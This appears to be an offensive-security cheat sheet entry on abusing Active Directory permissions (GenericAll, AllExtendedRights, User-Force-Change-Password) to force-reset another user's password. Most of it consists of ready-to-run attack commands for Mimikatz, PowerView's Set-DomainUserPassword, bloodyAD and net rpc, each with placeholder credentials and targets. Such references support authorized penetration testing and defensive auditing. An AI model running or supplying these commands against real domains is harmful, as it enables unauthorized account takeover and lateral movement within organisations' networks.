# ForceChangePassword

If you hold the `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` over the target user, you can change their password.
<style>
    
    code {
      white-space : pre-wrap !important;
    }
    </style>

    
### From Windows
Mimikatz:
```bash
lsadump::setntlm /user:$target_user /password:$target_pass /server:$domain
```

Powershell:
```powershell
$no_md_var_NewPassword = ConvertTo-SecureString '$target_pass' -AsPlainText -Force
Set-DomainUserPassword -Identity '$target_user' -AccountPassword $no_md_var_NewPassword
```

### From Linux

```bash
# With bloodyAD
bloodyAD --host "$dc" -d "$domain" -u "$user" -p "$pass" set password "$target_user" "$target_pass"

# With net rpc
net rpc password "$target_user" -U "$domain"/"$user"%"$pass" -S "$domain"
```

